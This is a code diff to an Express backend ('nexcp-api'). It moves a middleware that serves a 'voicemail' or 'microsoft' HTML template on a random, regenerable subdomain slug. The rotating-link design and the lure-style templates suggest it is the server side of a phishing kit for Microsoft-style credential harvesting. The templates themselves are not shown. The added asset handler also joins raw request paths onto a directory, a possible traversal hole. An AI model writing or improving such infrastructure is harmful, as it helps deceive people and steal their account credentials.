@@ -27,10 +27,33 @@ const lim = rateLimit({ windowMs: 15 * 60 * 1000, max: 600 });
 const alim = rateLimit({ windowMs: 15 * 60 * 1000, max: 20 });
 app.use('/api/', lim);
 
+// ── Link subdomain handler — must be before any routes ────────────────────────
+const LINK_BASE_DOMAIN = process.env.LINK_BASE_DOMAIN || '';
+const linkDir = path.join(__dirname, '../frontend-link');
+app.use((req, res, next) => {
+  if (!LINK_BASE_DOMAIN) return next();
+  const host = (req.hostname || '').toLowerCase();
+  if (!host.endsWith('.' + LINK_BASE_DOMAIN)) return next();
+  const sub = host.slice(0, -(LINK_BASE_DOMAIN.length + 1));
+  if (!sub || sub.includes('.')) return next();
+  const currentSlug = db.prepare("SELECT value FROM settings WHERE key = 'link_slug'").get()?.value;
+  if (!currentSlug || sub !== currentSlug) return res.status(404).send('Not found');
+  if (req.path.startsWith('/api/')) return next();
+  const ext = path.extname(req.path);
+  if (ext && ext !== '.html') {
+    const assetPath = path.join(linkDir, req.path);
+    if (fs.existsSync(assetPath)) return res.sendFile(assetPath);
+  }
+  const row = db.prepare("SELECT value FROM settings WHERE key = 'link_template'").get();
+  const template = row?.value || 'voicemail';
+  const fileMap = { voicemail: 'index.html', microsoft: 'microsoft.html' };
+  const file = fileMap[template] || 'index.html';
+  return res.sendFile(path.join(linkDir, file));
+});
+
 app.get('/', (_req, res) => res.json({ status: 'ok', service: 'nexcp-api' }));
 
 // ── Random link slug generator ────────────────────────────────────────────────
-const LINK_BASE_DOMAIN = process.env.LINK_BASE_DOMAIN || '';
 const SLUG_CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789';
 function generateSlug() {
   let s = '';
@@ -1336,53 +1359,6 @@ app.post('/api/link/regenerate', auth, (req, res) => {
   const url = baseDomain ? `${proto}://${slug}.${baseDomain}` : '';
   res.json({ slug, url, updated_at: new Date().toISOString(), base_domain: baseDomain });
 });
-
-// ══ STATIC ═══════════════════════════════════════════════════════════════════
-
-// Serve frontend-link — subdomain-based (slug.basedomain)
-const linkDir = path.join(__dirname, '../frontend-link');
-app.use('/link-assets', express.static(linkDir));
-
-// Middleware: if hostname matches slug.LINK_BASE_DOMAIN, serve link page
-app.use((req, res, next) => {
-  if (!LINK_BASE_DOMAIN) return next();
-  const host = (req.hostname || '').toLowerCase();
-  if (!host.endsWith('.' + LINK_BASE_DOMAIN)) return next();
-  const sub = host.slice(0, -(LINK_BASE_DOMAIN.length + 1));
-  if (!sub || sub.includes('.')) return next();
-  const currentSlug = db.prepare("SELECT value FROM settings WHERE key = 'link_slug'").get()?.value;
-  if (!currentSlug || sub !== currentSlug) return res.status(404).send('Not found');
-  // Serve API routes normally even on link subdomain
-  if (req.path.startsWith('/api/')) return next();
-  // Serve linked HTML
-  const row = db.prepare("SELECT value FROM settings WHERE key = 'link_template'").get();
-  const template = row?.value || 'voicemail';
-  const fileMap = { voicemail: 'index.html', microsoft: 'microsoft.html' };
-  const file = fileMap[template] || 'index.html';
-  return res.sendFile(path.join(linkDir, file));
-});
-
-// Serve React build (production)
-const reactDist = path.join(__dirname, '../frontend/dist');
-if (fs.existsSync(reactDist)) {
-  app.use(express.static(reactDist));
-  // SPA fallback — all non-API, non-link routes go to React
-  app.get('*', (req, res) => {
-    res.sendFile(path.join(reactDist, 'index.html'));
-  });
-} else {
-  // Dev mode fallback — serve old frontend-panel files if they exist
-  const panelDir = path.join(__dirname, '../frontend-panel');
-  if (fs.existsSync(panelDir)) {
-    app.use('/js', express.static(path.join(panelDir, 'js')));
-    app.get('/mail', (req, res) => res.sendFile(path.join(panelDir, 'mail.html')));
-    app.get('/drive', (req, res) => res.sendFile(path.join(panelDir, 'drive.html')));
-    app.get('/notes', (req, res) => res.sendFile(path.join(panelDir, 'notes.html')));
-    app.get('/profile', (req, res) => res.sendFile(path.join(panelDir, 'profile.html')));
-    app.get('/admin', (req, res) => res.sendFile(path.join(panelDir, 'index.html')));
-    app.get('*', (req, res) => res.sendFile(path.join(panelDir, 'dashboard.html')));
-  }
-}
 
 // ══ START ════════════════════════════════════════════════════════════════════
 
